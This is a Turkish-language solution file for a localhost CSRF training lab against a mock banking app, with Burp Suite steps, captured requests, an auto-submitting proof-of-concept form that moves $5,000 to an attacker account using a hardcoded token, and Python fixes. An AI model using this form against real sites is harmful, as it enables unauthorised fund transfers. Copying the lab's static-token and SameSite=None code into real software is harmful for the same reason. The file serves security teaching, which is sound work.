# 🔍 SOLUTION — Banka Saldırısı (CSRF Lab)

> ⚠️ **SPOILER UYARISI:** Bu dosya tam çözümü içerir. Lab'ı kendi başına denemeden bakmanı önermem. Sıkıştığında önce **İpuçları** kısmına bak, gerekirse Tam Çözüm'e geç.

---

## 💡 İpuçları (Tam Çözümden Önce)

<details>
<summary><b>İpucu 1 — Nereden başlamalı?</b></summary>

Bir bankacılık uygulamasında en kritik işlem nedir? Para transferi. O isteğin nasıl korunduğuna bak. Form'un HTML kaynağında bir gizli alan var. Onu bir kere not et, oturumu kapat, tekrar gir. **Aynı mı, farklı mı?**

</details>

<details>
<summary><b>İpucu 2 — Cookie'ler ne diyor?</b></summary>

Login olduktan sonra Burp HTTP history'de response'a bak. `Set-Cookie` header'larında **SameSite** değeri ne? Hangi cookie hangi durumlarda gönderilir? Modern tarayıcıların varsayılan davranışı nedir, bu uygulamada ne override edilmiş?

</details>

<details>
<summary><b>İpucu 3 — Saldırı vektörü</b></summary>

Mağduru kandırıp uygulamanın bir endpoint'ine **cross-origin** bir istek attırabilir misin? HTML'de otomatik submit olan bir form, doğru cookie politikasıyla birleşince ne olur?

</details>

---

## 🛠️ Burp Suite ile Adım Adım Akış

Burp'ın gömülü browser'ını kullan: **Proxy → Open Browser**.

### Intercept ON/OFF Stratejisi

| Adım | İşlem | Intercept | Sebep |
|------|-------|-----------|-------|
| 1 | Login sayfasını açma | OFF | CSS/font istekleri gürültüsü |
| 2 | Login POST'u | **ON** | Credential ve Set-Cookie'yi yakalamak |
| 3 | Transfer sayfasını yükleme | OFF | Statik içerik |
| 4 | Meşru transfer | **ON** | İstek yapısını Repeater'a almak |
| 5 | PoC HTML hazırlama | OFF | Burp dışı iş |
| 6 | CSRF tetikleme | **ON** | Origin/Referer/Cookie davranışını görmek |
| 7 | Bakiye doğrulaması | OFF | Sadece UI kontrolü |

### Adım 1 — Login Sayfasını Aç (Intercept OFF)

Burp browser'da `http://localhost:5001/login` adresine git.

### Adım 2 — Login İsteğini Yakala (Intercept ON)

Intercept'i ON yap, formu doldur (`user` / `user123`), Sign In'e bas. Yakalanan istek:

```http
POST /login HTTP/1.1
Host: localhost:5001
Content-Type: application/x-www-form-urlencoded

nickname=user&password=user123
```

Forward et. **HTTP history'de response'a bak**, Set-Cookie header'larını incele:

```http
Set-Cookie: session=eyJ1c2VyIjoidXNlciJ9...; HttpOnly; Path=/
Set-Cookie: session_id=<rastgele16byte>; HttpOnly; Path=/; SameSite=None
```

⚠️ **Burada zafiyetin merkezi:** `session_id` cookie'si `SameSite=None` ve `Secure` flag yok.

### Adım 3 — Transfer Sayfasını İncele (Intercept OFF)

`/transfer`'a yönlendirildiğinde sayfanın kaynağını gör. Gizli alanda:

```html
<input type="hidden" name="csrf_token" value="a1b2c3d4e5f6789012345678abcdef00" />
```

⚠️ **İkinci zafiyet:** Bu token statik. Logout/login yap, aynı kalıyor — saldırgan önceden biliyor.

### Adım 4 — Meşru Transfer Yap (Intercept ON)

Form'a `attacker_account` / `100` gir, gönder. Yakalanan POST'u **Repeater'a gönder** (sağ tık → Send to Repeater).

```http
POST /transfer HTTP/1.1
Host: localhost:5001
Cookie: session=...; session_id=...
Content-Type: application/x-www-form-urlencoded

csrf_token=a1b2c3d4e5f6789012345678abcdef00&recipient=attacker_account&amount=100
```

### Adım 5 — PoC HTML Hazırla (Intercept OFF)

Masaüstünde `csrf_poc.html` oluştur:

```html
<!DOCTYPE html>
<html><body>
  <h3>You won a prize! Click to claim.</h3>
  <form id="csrf" action="http://localhost:5001/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="a1b2c3d4e5f6789012345678abcdef00" />
    <input type="hidden" name="recipient" value="attacker_account" />
    <input type="hidden" name="amount" value="5000" />
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body></html>
```

Farklı bir origin'den sun (port 8080 Burp ile çakışır, **9090 kullan**):

```bash
python3 -m http.server 9090
```

### Adım 6 — Saldırıyı Tetikle (Intercept ON)

Mağdur sekmesi açık olsun (login durumda `/transfer`'da). **Yeni sekmede** `http://127.0.0.1:9090/csrf_poc.html`'ı aç.

Sayfa açıldığı an form otomatik submit olur. Burp'ın yakaladığı istek:

```http
POST /transfer HTTP/1.1
Host: localhost:5001
Origin: http://127.0.0.1:9090
Referer: http://127.0.0.1:9090/csrf_poc.html
Cookie: session_id=...
Content-Type: application/x-www-form-urlencoded

csrf_token=a1b2c3d4e5f6789012345678abcdef00&recipient=attacker_account&amount=5000
```

### Adım 7 — Bakiyeyi Doğrula (Intercept OFF)

Mağdur sekmesinde sayfayı yenile. Bakiye $5,000 düşmüş olmalı. **Saldırı kanıtlandı.**

---

## 🐛 Zafiyetler (Tam Çözüm)

<details>
<summary><b>Zafiyet zincirini açık göster</b></summary>

### Zafiyet 1 — Statik CSRF Token

`app.py` içinde token sabit kodlanmış:
```python
CSRF_TOKEN = "a1b2c3d4e5f6789012345678abcdef00"
```
Her kullanıcıda, her oturumda aynı değer. Saldırgan bu token'ı bir kez öğrenince (örn. kendi hesabıyla giriş yapıp HTML'i inceleyerek) **tüm kullanıcılar için kullanabilir**. Token, per-session ve rastgele olmalıydı.

### Zafiyet 2 — Cookie SameSite Yapılandırması

`session_id` cookie'si `SameSite=None` olarak set ediliyor:
```python
response.set_cookie(
    "session_id",
    value=os.urandom(16).hex(),
    samesite="None",
    secure=False,
    httponly=True
)
```
Bu, cookie'nin **cross-site isteklerde otomatik gönderilmesi** anlamına gelir — CSRF saldırısının ön koşulu. Üstelik `Secure=False`, yani HTTPS bile gerekmiyor.

### Zafiyet 3 — Origin/Referer Doğrulaması Yok

Sunucu, `/transfer` endpoint'ine gelen POST isteğinin **nereden tetiklendiğine bakmıyor**. Origin başka bir site olsa bile isteği işliyor. `request.headers.get("Origin")` kontrolü kodda hiç yok.

</details>

---

## 🎯 Saldırganın Kendini Ele Verdiği Yerler

Burp HTTP history'de yakalanan saldırı isteğinde **dört imza** var:

1. **`Origin: http://127.0.0.1:9090`** — bankanın kendi domain'i değil. Beklenen değer `http://localhost:5001` olmalıydı.
2. **`Referer: http://127.0.0.1:9090/csrf_poc.html`** — kötü niyetli kaynak açıkça yazılı. Bir kullanıcı normalde uygulamanın içinden tıklarsa Referer kendi domain'i olur.
3. **Cookie davranışı** — Cookie header'ında oturum cookie'leri var ama istek cross-site. Bu, SameSite politikasının yanlış yapılandırıldığının kanıtı.
4. **Davranışsal anomali** — Transfer zamanı (03:47), miktarı (kullanıcının ortalama işleminin çok üstünde), recipient (daha önce hiç görülmemiş hesap). Bu üçü birden olağan profile uymaz.

> **Blue team perspektifi:** SOC ekibi `Origin` header'ını farklı domain olarak gören tüm POST isteklerini alarmlamalı. WAF kuralı: `if Origin != "https://bankamiz.com" then block`.

---

## 🛡️ Düzeltme Önerileri

### 1. CSRF Token'ı Doğru Üret

```python
import secrets

@app.route("/transfer", methods=["GET", "POST"])
def transfer():
    if "user" not in session:
        return redirect(url_for("login"))
    
    # Her session için bir kez üret
    if "csrf_token" not in session:
        session["csrf_token"] = secrets.token_hex(32)
    
    if request.method == "POST":
        # Sabit string ile değil, session'daki token ile karşılaştır
        if request.form.get("csrf_token") != session["csrf_token"]:
            abort(403)
        # ...
```

### 2. Cookie Yapılandırmasını Sıkılaştır

```python
app.config.update(
    SESSION_COOKIE_SAMESITE="Strict",  # kritik işlemler için Strict
    SESSION_COOKIE_SECURE=True,         # HTTPS zorunlu
    SESSION_COOKIE_HTTPONLY=True,       # JS'den erişim yok
)
```

### 3. Origin / Referer Doğrulaması

```python
ALLOWED_ORIGINS = {"https://bankamiz.com"}

@app.before_request
def check_origin():
    if request.method == "POST":
        origin = request.headers.get("Origin", "")
        referer = request.headers.get("Referer", "")
        if origin and origin not in ALLOWED_ORIGINS:
            abort(403)
        # Ek olarak Referer kontrolü
```

### 4. HTTPS Zorunlu

Production'da reverse proxy (nginx, Cloudflare) ile TLS sonlandırması yap, HTTP'yi HTTPS'e redirect et.

### 5. Hassas İşlemlerde Ek Doğrulama

- 2FA (TOTP, SMS) — özellikle yüksek meblağ transferlerinde
- Email/SMS ile transfer onayı
- Davranışsal risk skorlaması (anormal saatler, yeni recipient için ekstra adım)

---

## 📊 Bu Lab'ın Kapsamadığı Konular

İlerlemiş bir CSRF analizi için bu lab'ın değinmediği başka teknikler:

- **Login CSRF** — saldırgan kendi hesabına login ettirip aktivite topluyor
- **JSON tabanlı CSRF** — `Content-Type: application/json` ile bypass denemeleri
- **CORS misconfiguration ile CSRF** — `Access-Control-Allow-Origin: *` + credentials
- **SameSite=Lax bypass** — `<form method="GET">` ile top-level navigasyon
- **CSRF + XSS chain** — XSS varsa CSRF token okumak

Bu lab seviye 1. İleriki seviyelerde bu vektörler işlenecek.

---

> *"Bir saldırı çalıştığı için zekice değildir — savunma çalışmadığı için çalışır."*
